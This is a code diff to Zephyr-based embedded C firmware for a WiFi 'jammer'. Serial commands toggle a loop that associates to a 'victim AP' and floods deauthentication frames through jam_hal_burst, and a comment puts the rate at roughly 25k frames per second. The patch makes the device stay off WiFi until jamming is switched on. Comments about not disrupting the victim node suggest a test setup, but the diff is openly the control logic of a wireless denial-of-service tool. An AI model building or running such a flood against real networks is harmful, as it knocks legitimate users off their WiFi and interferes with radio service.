@@ -29,7 +29,7 @@ extern int jam_hal_burst(int count);
 
 static struct net_if *wifi_iface;
 static volatile bool associated;
-static volatile bool jamming;
+static volatile bool want_jam;   /* set by 's' (RF on), cleared by 'x' (RF off) */
 static struct net_mgmt_event_callback wifi_cb;
 static const struct device *const console_dev =
 	DEVICE_DT_GET(DT_CHOSEN(zephyr_console));
@@ -96,14 +96,14 @@ static void serial_thread(void *p1, void *p2, void *p3)
 	while (1) {
 		while (uart_poll_in(console_dev, &ch) == 0) {
 			if (ch == 's' || ch == 'S') {
-				jamming = true;
-				printk("JAM: START\n");
+				want_jam = true;
+				printk("JAM: RF ON (associate + deauth)\n");
 			} else if (ch == 'x' || ch == 'X') {
-				jamming = false;
-				printk("JAM: STOP\n");
+				want_jam = false;
+				printk("JAM: RF OFF (disconnect)\n");
 			} else if (ch == '?') {
-				printk("JAM: assoc=%d jamming=%d\n", associated,
-				       jamming);
+				printk("JAM: assoc=%d want_jam=%d\n", associated,
+				       want_jam);
 			}
 		}
 		k_msleep(30);
@@ -124,30 +124,42 @@ int main(void)
 	net_mgmt_init_event_callback(&wifi_cb, wifi_evt, WIFI_EVENTS);
 	net_mgmt_add_event_callback(&wifi_cb);
 
-	net_if_up(wifi_iface);
-	do_connect();
-	printk("JAM: joining %s; send 's' to start deauth flood\n", JS_WIFI_SSID);
+	printk("JAM: idle; send 's' to start RF deauth (it stays off WiFi until then)\n");
 
-	uint64_t last_try = k_uptime_get();
+	uint64_t last_try = 0;
 	uint32_t total = 0;
 
 	while (1) {
-		if (!associated) {
-			if (k_uptime_get() - last_try > RETRY_MS) {
-				last_try = k_uptime_get();
-				do_connect();
-			}
-			k_msleep(200);
-		} else if (jamming) {
-			int ret = jam_hal_burst(BURST);
+		if (want_jam) {
+			/* RF requested: associate to the victim AP, then flood. */
+			if (!associated) {
+				if (last_try == 0 ||
+				    k_uptime_get() - last_try > RETRY_MS) {
+					last_try = k_uptime_get();
+					do_connect();
+				}
+				k_msleep(200);
+			} else {
+				int ret = jam_hal_burst(BURST);
 
-			total += BURST;
-			if (total % (BURST * 40U) == 0U) {
-				printk("JAM: deauth total=%u last=%d\n", total, ret);
+				total += BURST;
+				if (total % (BURST * 40U) == 0U) {
+					printk("JAM: deauth total=%u last=%d\n",
+					       total, ret);
+				}
+				/* Sleep (not just yield) so the lower-priority serial
+				 * thread runs to process 'x'. Still ~25k frames/s. */
+				k_msleep(2);
 			}
-			k_yield();
 		} else {
-			k_msleep(100);
+			/* Idle: stay OFF WiFi so we don't disrupt the victim node. */
+			if (associated) {
+				(void)net_mgmt(NET_REQUEST_WIFI_DISCONNECT,
+					       wifi_iface, NULL, 0);
+				printk("JAM: disconnected (idle)\n");
+			}
+			last_try = 0;
+			k_msleep(150);
 		}
 	}
 	return 0;
